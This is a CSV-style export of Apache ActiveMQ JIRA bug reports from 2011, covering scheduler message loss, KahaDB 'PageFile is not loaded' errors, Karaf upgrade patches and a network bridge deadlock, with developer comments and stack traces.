JMX attribute change doesn't affect store usage,AMQ-3143,12495803,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,17/Jan/11 16:41,14/Feb/17 11:35,14/Jul/23 05:43,17/Jan/11 16:49,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"When producer is blocked on store usage limit, increasing the limit in JConsole doesn't unblock the producer",,jira-bot,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6547,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14712,,,Tue Feb 14 11:34:25 UTC 2017,,,,,,,,,,,"0|i0agx3:",59014,,,,,,,,,,,,,,,,,,,,,"17/Jan/11 16:49;dejanb;Fixed with svn revision 1059981;;;","14/Feb/17 11:34;jira-bot;Commit fad50812af792606efca5653f9b4761e663ac087 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=fad5081 ]

[AMQ-6547] revert mod from AMQ-3143 such that waitForSpace respects child usage, fix test and validate mKahadb blocking send
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare the upgrade to Karaf 2.2,AMQ-3142,12495753,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,jbonofre,jbonofre,17/Jan/11 09:12,24/Mar/11 13:03,14/Jul/23 05:43,04/Mar/11 11:01,,,,,,5.5.0,,,,,,,1,,,,,,,,,"ActiveMQ 5.4.x uses Karaf 2.1.0.

Karaf 2.2.0 will be released soon. A change affects ActiveMQ: a new Felix gogo version.

For instance, if you try to deploy ActiveMQ 5.4.2 on Karaf 2.1.99-SNAPSHOT, you will get an unresolved constraint as the Felix Gogo export package changed.

In preparation for the support of Karaf 2.2.0, I'm gonna submit a patch to update the Import-Package and use the corresponding Gogo version.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Mar/11 07:45;pieber;AMQ3142.patch;https://issues.apache.org/jira/secure/attachment/12472512/AMQ3142.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14616,,,Thu Mar 24 13:03:02 UTC 2011,,,,,,,,,,,"0|i0ajzz:",59513,,,,,,,,,,,,,,,,,,,,,"03/Mar/11 07:37;danttran;Hi JB, is there a way to manually patch activemaq 5.4 to get this issue fixed ( while waiting for official fix 5.5? )

Thanks;;;","03/Mar/11 07:46;pieber;I've patched AMQ to run smoothly on karaf-2.2.0. @Dan: Feel free to give the patch attached to this issue a try and report your feedback;;;","04/Mar/11 11:01;dejanb;Patched applied with svn revision 1077868. Thanks!;;;","23/Mar/11 16:55;dejanb;I'm trying now to make 5.5.0 work with both karaf 2.1.x and 2.2.0 and newer, but have some difficulties at the moment. I created a separate features for [2.1.x|http://svn.apache.org/viewvc/activemq/trunk/activemq-karaf/src/main/resources/features-2.1.xml?revision=1084635&view=markup].

But trying to do:

{code}
karaf@root> features:addUrl mvn:org.apache.activemq/activemq-karaf/5.5-SNAPSHOT/xml/features-2.1
karaf@root> features:install activemq-spring 
{code}

gets

{code}
Error executing command: Could not start bundle mvn:org.apache.activemq/activemq-karaf/5.5-SNAPSHOT in feature(s) activemq-5.5-SNAPSHOT: Unresolved constraint in bundle activemq-karaf [64]: Unable to resolve 64.0: missing requirement [64.0] package; (&(package=org.apache.felix.gogo.commands)(version>=0.6.0)(!(version>=1.0.0)))
{code}


I tried manually adding gogo commands and runtime (v 0.8.0) but with no luck. Can someone else take a look at it, as I might missing something obvious.

 

;;;","23/Mar/11 19:21;pieber;This is strange. I'm sure I've already fixed this. Could you please locally apply my second patch @AMQ-3207, build locally and try again?;;;","24/Mar/11 13:03;dejanb;This is now solved by using older (5.4.2) activemq-karaf for older versions. It's also documented here 

https://cwiki.apache.org/confluence/display/ACTIVEMQ/OSGi+Integration

Thanks to Andreas for suggestion;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages may be lost when schedule them with a short delay,AMQ-3141,12495727,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,moczarski,moczarski,16/Jan/11 22:03,04/Sep/13 20:51,14/Jul/23 05:43,09/Feb/11 16:05,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"The message scheduler has an optimization, that the schedule time will be aligned to seconds. All messages which included in the same second will be maintained in one store entry with a list of jobs. 
The list will be read from the store during the main loop, the entries will be executed and the list will be deleted from the store. When new messages are added on the same list during the scheduling, these messages could be lost.
One possible fix could be, that the main loop reads and removes the lists in one atomic step due to a synchronization. 
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4073,,,,,,,,,,,,,,,AMQ-3140,"16/Jan/11 22:12;moczarski;AMQ3141.patch;https://issues.apache.org/jira/secure/attachment/12468520/AMQ3141.patch","16/Jan/11 22:12;moczarski;AMQ3141Test.patch;https://issues.apache.org/jira/secure/attachment/12468519/AMQ3141Test.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14727,,,Wed Feb 09 16:05:52 UTC 2011,,,,,,,Patch Available,,,,"0|i0ak07:",59514,,,,,,,,,,,,,,,,,,,,,"16/Jan/11 22:12;moczarski;Test and patch attached.;;;","16/Jan/11 22:16;moczarski;This patch depends on AMQ-3140 because the schedule method must be synchronized so that the main loop use the same lock.;;;","09/Feb/11 16:05;tabish;Patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Lost messages when scheduling messages concurrently,AMQ-3140,12495724,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,moczarski,moczarski,16/Jan/11 20:32,02/May/13 02:29,14/Jul/23 05:43,09/Feb/11 15:25,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"We observed some problems with the scheduler component. One issue is, that the kaha db files from the scheduler won't be removed. On further investigation I found a potential cause which could be exposed by a test. When messages are send concurrently delayed by the scheduler, messages will be lost. It seems that the schedule method on JobSchedulerImpl should be synchronized.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3141,,,"16/Jan/11 21:18;moczarski;AMQ3140.patch;https://issues.apache.org/jira/secure/attachment/12468516/AMQ3140.patch","16/Jan/11 21:18;moczarski;AMQ3140Test.patch;https://issues.apache.org/jira/secure/attachment/12468515/AMQ3140Test.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14720,,,Wed Feb 09 15:25:02 UTC 2011,,,,,,,Patch Available,,,,"0|i0ak0f:",59515,,,,,,,,,,,,,,,,,,,,,"16/Jan/11 21:18;moczarski;Unit test and patch attached. To get the needed concurrency in the test, I have disable the debug log for the scheduling component (see modification in log4j.properties file).;;;","09/Feb/11 15:25;tabish;Confirmed the problem, Patches applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failed to reset batching ... java.lang.IllegalStateException: PageFile is not loaded,AMQ-3131,12495322,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,ives.stoddard,ives.stoddard,12/Jan/11 00:24,18/Jan/12 16:50,14/Jul/23 05:43,22/Nov/11 23:08,5.4.2,,,,,5.6.0,,,Message Store,,,,11,,,,,,,,,"
The following error just started showing up in our ActiveMQ log file for unknown reasons (repeated 11 times, all within a second):

{noformat}

2011-01-11 03:42:00,997 | ERROR | Failed to reset batching | org.apache.activemq.store.kahadb.KahaDBStore | Thread-2002
java.lang.IllegalStateException: PageFile is not loaded
        at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:721)
        at org.apache.kahadb.page.PageFile.tx(PageFile.java:239)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.resetBatching(KahaDBStore.java:512)
        at org.apache.activemq.store.ProxyMessageStore.resetBatching(ProxyMessageStore.java:93)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.resetBatch(QueueStorePrefetch.java:85)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.stop(AbstractStoreCursor.java:69)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.stop(StoreQueueCursor.java:84)
        at org.apache.activemq.broker.region.Queue.stop(Queue.java:853)
        at org.apache.activemq.broker.region.AbstractRegion.stop(AbstractRegion.java:110)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.region.RegionBroker.doStop(RegionBroker.java:713)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.doStop(ManagedRegionBroker.java:113)
        at org.apache.activemq.broker.region.RegionBroker.stop(RegionBroker.java:213)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.scheduler.SchedulerBroker.stop(SchedulerBroker.java:104)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.TransactionBroker.stop(TransactionBroker.java:114)
        at org.apache.activemq.broker.BrokerService$3.stop(BrokerService.java:1773)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:575)
        at org.apache.activemq.console.command.StartCommand$1.run(StartCommand.java:135)
{noformat}

Similarly we now have an issue on shutdown, with the following error (also repeating 11 times):

{noformat}
2011-01-11 10:34:39,652 | ERROR | Failed to reset batching | org.apache.activemq.store.kahadb.KahaDBStore | ActiveMQ ShutdownHook
java.lang.IllegalStateException: PageFile is not loaded
        at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:721)
        at org.apache.kahadb.page.PageFile.tx(PageFile.java:239)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.resetBatching(KahaDBStore.java:512)
        at org.apache.activemq.store.ProxyMessageStore.resetBatching(ProxyMessageStore.java:93)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.resetBatch(QueueStorePrefetch.java:85)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.stop(AbstractStoreCursor.java:69)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.stop(StoreQueueCursor.java:84)
        at org.apache.activemq.broker.region.Queue.stop(Queue.java:853)
        at org.apache.activemq.broker.region.AbstractRegion.stop(AbstractRegion.java:110)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.region.RegionBroker.doStop(RegionBroker.java:713)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.doStop(ManagedRegionBroker.java:113)
        at org.apache.activemq.broker.region.RegionBroker.stop(RegionBroker.java:213)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.scheduler.SchedulerBroker.stop(SchedulerBroker.java:104)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.TransactionBroker.stop(TransactionBroker.java:114)
        at org.apache.activemq.broker.BrokerService$3.stop(BrokerService.java:1773)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:575)
        at org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:1971)
        at org.apache.activemq.broker.BrokerService$4.run(BrokerService.java:1938)
{noformat}

Subsequent start / stops result in the same shutdown errors above.

Is there a workaround for this besides deleting the datastore DB files?


","- Sun Solaris 5.10
- Master / Slave with shared storage",artnaseef,cwikman,dwallace@udel.edu,fgynnild,iocanel,ives.stoddard,jplmelanson,lexsoto,luggage,matt_good@yahoo.com,moczarski,sbucci,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74728,,,Wed Jan 18 16:50:40 UTC 2012,,,,,,,,,,,"0|i0agxb:",59015,,,,,,,,,,,,,,,,,,,,,"14/Jan/11 10:03;gtully;please attach the full log of the broker if this occurs again. the additional context may help diagnose.;;;","03/Feb/11 13:37;fgynnild;I ran into the same issue today, but I got if after changing some parameters in the activemq.xml file and then did a restart of AMQ.;;;","03/Feb/11 15:14;ives.stoddard;@Frank: couple questions...

1) do you recall what the changes were to activemq.xml?
2) are you using the scheduler functionality?
3) are you using anything other than the default prefectch or batching settings?

Thanks.;;;","25/Feb/11 11:46;iocanel;I am having similar issues. In my case they are clearly related to the scheduler.


javax.jms.JMSException: PageFile is not loaded
        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
        at org.apache.activemq.ActiveMQConnection.onAsyncException(ActiveMQConnection.java:1833)
        at org.apache.activemq.ActiveMQConnection$2$1.run(ActiveMQConnection.java:1754)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
Caused by: java.lang.IllegalStateException: PageFile is not loaded
        at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:721)
        at org.apache.kahadb.page.PageFile.tx(PageFile.java:239)
        at org.apache.activemq.broker.scheduler.JobSchedulerImpl.schedule(JobSchedulerImpl.java:110)
        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:185)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:227)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:462)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:677)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:129)
        at org.apache.activemq.transport.nio.NIOTransport.access$000(NIOTransport.java:44)
        at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:68)
        at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)
        at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)
        ... 3 more
;;;","02/Mar/11 10:40;sbucci;I have the same problem after an activemq.xml change.
Environment : 
 - Windows xp/2008 r2
 - I'm using scheduler

{code:java}
2011-02-10 05:00:46,992 | ERROR | Failed to reset batching | org.apache.activemq.store.kahadb.KahaDBStore | ActiveMQ ShutdownHook
java.lang.IllegalStateException: PageFile is not loaded
	at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:721)
	at org.apache.kahadb.page.PageFile.tx(PageFile.java:239)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.resetBatching(KahaDBStore.java:512)
	at org.apache.activemq.store.ProxyMessageStore.resetBatching(ProxyMessageStore.java:93)
	at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.resetBatch(QueueStorePrefetch.java:85)
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.stop(AbstractStoreCursor.java:69)
	at org.apache.activemq.broker.region.cursors.StoreQueueCursor.stop(StoreQueueCursor.java:84)
	at org.apache.activemq.broker.region.Queue.stop(Queue.java:853)
	at org.apache.activemq.broker.region.AbstractRegion.stop(AbstractRegion.java:110)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.region.RegionBroker.doStop(RegionBroker.java:713)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.doStop(ManagedRegionBroker.java:113)
	at org.apache.activemq.broker.region.RegionBroker.stop(RegionBroker.java:213)
	at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.stop(SchedulerBroker.java:104)
	at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
	at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
	at org.apache.activemq.broker.TransactionBroker.stop(TransactionBroker.java:114)
	at org.apache.activemq.broker.BrokerService$3.stop(BrokerService.java:1773)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:575)
	at org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:1971)
	at org.apache.activemq.broker.BrokerService$4.run(BrokerService.java:1938)
{code};;;","08/Apr/11 22:18;matt_good@yahoo.com;I have the same problem.  In my case, I deleted several queues from admin console.  These queues were used for testing scheduled messages.  When I stopped ActiveMQ, I got 5 of these errors.  When I restarted it 5 of the queues I deleted reappeared.  Coincidence or part of the problem - I can't say.;;;","18/Nov/11 19:08;jplmelanson;Similar stack trace here:
{code}
Caused by: java.lang.IllegalStateException: PageFile is not loaded 
  at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:721) 
  at org.apache.kahadb.page.PageFile.tx(PageFile.java:239) 
  at org.apache.activemq.broker.scheduler.JobSchedulerImpl.schedule(JobSchedulerImpl.java:110) 
  at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:185) 
  at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) 
  at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
{code} 

I haven't reproduced it yet, but I opened up the trunk code and seems like {{JobSchedulerImpl.schedule()}} methods are using the {{tx()}} method, which in turn asserts that the {{PageFile}} is loaded, which doesn't seems to be the case. 

I don't know the code at all, but I wonder if the job scheduler should check if the page file is loaded first, load it if needed and process with the transaction? What do you think?;;;","22/Nov/11 23:02;gtully;For the shutdown case, there is a fix on trunk, the org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.resetBatching(KahaDBStore.java:512) checks if the page file has been unloaded as it will be due to being shutdown before the destinations.
http://svn.apache.org/viewvc?rev=1170201&view=rev;;;","22/Nov/11 23:08;gtully;The schedular store is not started when it is created so the use before initialisation error should not occur on trunk. Reopen if this is reproducible with trunk of 5.6 ;;;","13/Jan/12 18:22;artnaseef;Hey Gary, we need to back-port a patch as we are not comfortable to run the 5.6-SNAPSHOT to fix this problem and the 5.5.1 version is still problematic.

After back-porting all of the changes to the Scheduler code, this still happens.

Do you have any idea where else I should look?  I've been going through all of the Jira entries resolved in 5.6 and not finding any promising leads.
;;;","17/Jan/12 19:51;artnaseef;SCRATCH THAT.

I had build problems that prevented the updates from taking effect.  Using the latest version of the scheduler sources resolves the problem for us.;;;","17/Jan/12 20:10;gtully;Glad you got sorted :-)
On Jan 17, 2012 7:51 p.m., ""Arthur Naseef (Commented) (JIRA)"" <

;;;","18/Jan/12 08:38;ishitori;Arthur, right now I experience the same error. Moreover, I can see a lot of .log files in KahaDb. I believe that they are not got cleaned up because of this exception.

I also don't want to move to 5.6.0 and I would love to have this fix in 5.5.1 version. Can you commit your changes into 5.5.1 version so the latest snapshot of 5.5.1 would have your changes?;;;","18/Jan/12 15:21;devantor;I don't know the steps to reproduce this one. But this bug affect also expired messages. org.apache.activemq.broker.region.Queue.expireMessages(Queue.java:772)

Failed to reset batching
java.lang.IllegalStateException: PageFile is not loaded
at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:721)
at org.apache.kahadb.page.PageFile.tx(PageFile.java:239)
at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.resetBatching(KahaDBStore.java:469)
at org.apache.activemq.store.ProxyMessageStore.resetBatching(ProxyMessageStore.java:93)
at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.resetBatch(QueueStorePrefetch.java:85)
at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:256)
at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
at org.apache.activemq.broker.region.Queue.doBrowse(Queue.java:1009)
at org.apache.activemq.broker.region.Queue.expireMessages(Queue.java:772)
at org.apache.activemq.broker.region.Queue.access$100(Queue.java:83)
at org.apache.activemq.broker.region.Queue$2.run(Queue.java:123)
at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
at java.util.TimerThread.mainLoop(Timer.java:512)
at java.util.TimerThread.run(Timer.java:462);;;","18/Jan/12 15:34;gtully;@devantor: for the periodic expiry case, that can be disabled via policy entry, expireMessagesPeriod=0
Expiry will still occur on send/dispatch, the only problem will be when there are no consumers, there will be no check for expiry, so expired messages can build up till dispatch is attempted again. ;;;","18/Jan/12 16:50;artnaseef;Sergei - my issue was with the scheduler for which the fixes are in 5.5.1, I believe.  If your having trouble due to the scheduler, the latest head version of the sources for the following directory fixed my problem:

activemq-core/src/main/java/org/apache/activemq/broker/scheduler

Note that we still see ""failed to reset batching"" errors with this update when shutting down the brokers if there are messages still pending delivery in the scheduler, but that's not a problem for us.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ's Activator not discovering other bundles with extensions.,AMQ-3130,12495295,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,11/Jan/11 20:12,11/Jan/11 20:21,14/Jul/23 05:43,11/Jan/11 20:21,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14781,,,Tue Jan 11 20:21:59 UTC 2011,,,,,,,,,,,"0|i0ak1r:",59521,,,,,,,,,,,,,,,,,,,,,"11/Jan/11 20:21;chirino;fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Can only have one duplex networkConnection per transportConnection,AMQ-3129,12495294,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,asussman,asussman,11/Jan/11 20:07,10/Feb/11 11:10,14/Jul/23 05:43,10/Feb/11 11:10,,,,,,5.5.0,,,,,,,0,,,,,,,,,"AMQ-2774 introduced an unintended restriction on the number of duplex networkConnections you
can make to the same port on a remote broker.   This causes issues in scenarios where you want
more than one duplex connection in order to have different settings for different kinds of destinations
(for example: different conduitSubscription settings for topics vs queues).

See:

http://activemq.2283324.n4.nabble.com/conduit-subscriptions-vs-full-duplex-on-network-connections-td3208138.html

and

AMQ-2774",,artnaseef,chaggstrom,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2774,AMQ-3176,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14722,,,Thu Feb 10 11:10:14 UTC 2011,,,,,,,,,,,"0|i0ak1z:",59522,Regression,,,,,,,,,,,,,,,,,,,,"10/Feb/11 11:10;gtully;see http://svn.apache.org/viewvc?rev=1069339&view=rev rework of changes from AMQ-2774 that introduced the limitation;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network bridge causes deadlock on queue/topic when message dispatch and consumer registration overlap.,AMQ-3127,12495173,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,stirlingc,stirlingc,10/Jan/11 21:46,11/Jul/14 19:00,14/Jul/23 05:43,11/Jul/14 19:00,5.4.2,,,,,,,,Broker,,,,0,,,,,,,,,"Symptom
=======
We have an AMQ 5.3.1 production environment with 7 brokers networked over HTTP using the DiscoveryNetworkConnector and SimpleDiscoveryAgent.  The brokers share a number of topics and queues.  Periodically, we have a catastrophic (cause still uknown) network outage that only affects the outbound bridges from one of the 7 brokers.  The affected broker detects the outage, stops the existing 6 outbound bridges, and starts 6 new outbound bridges.  Frequently, we find that the outbound bridges appear to be recreated properly, but messages produced by the affected broker to *some* of its shared queues/topics are no longer dispatched to the remote brokers.

We have verified that the cause of this issue exists in AMQ 5.4.2.

Cause
=====
Analysis of the affected broker's threads revealed a deadlock between one of the BrokerService threads, which was dispatching a message across an outbound bridge, and a transport thread (e.g., VMTransport or HTTP Reader) that was receiving a new subscriptions from the outbound bridge:

Daemon Thread [BrokerService[broker1] Task] (Suspended)	
	owns: Object  (id=104)	
	owns: Object  (id=105)	
	owns: Object  (id=106)	
	owns: Queue$3  (id=107)	
	waiting for: Object  (id=108)	
		owned by: Daemon Thread [VMTransport] (Running)	
	MutexTransport.oneway(Object) line: 40	
	ResponseCorrelator.oneway(Object) line: 60	
	DemandForwardingBridge(DemandForwardingBridgeSupport).serviceLocalCommand(Command) line: 738	
	DemandForwardingBridgeSupport$2.onCommand(Object) line: 161	
	ResponseCorrelator.onCommand(Object) line: 116	
	MutexTransport(TransportFilter).onCommand(Object) line: 69	
	VMTransport.dispatch(VMTransport, TransportListener, Object) line: 122	
	VMTransport.oneway(Object) line: 113	
	MutexTransport.oneway(Object) line: 40	
	ResponseCorrelator.oneway(Object) line: 60	
	ManagedTransportConnection(TransportConnection).dispatch(Command) line: 1249	
